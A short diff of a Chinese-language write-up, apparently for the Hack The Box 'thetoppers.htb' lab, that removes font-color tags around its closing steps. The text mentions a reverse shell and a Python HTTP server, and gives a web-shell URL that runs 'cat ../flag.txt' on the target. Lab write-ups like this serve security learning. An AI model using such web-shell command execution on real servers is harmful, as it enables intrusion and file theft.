@@ -85,9 +85,9 @@ python3 -m http.server 8090
 
 进行反弹shell
 
-也可以直接<font style="color:rgb(0, 0, 0);">浏览器输入以下命令获取flag</font>
+也可以直接浏览器输入以下命令获取flag
 
-<font style="color:rgb(0, 0, 0);">http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt（先ls../一下）</font>
+http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt（先ls../一下）
 
 
 
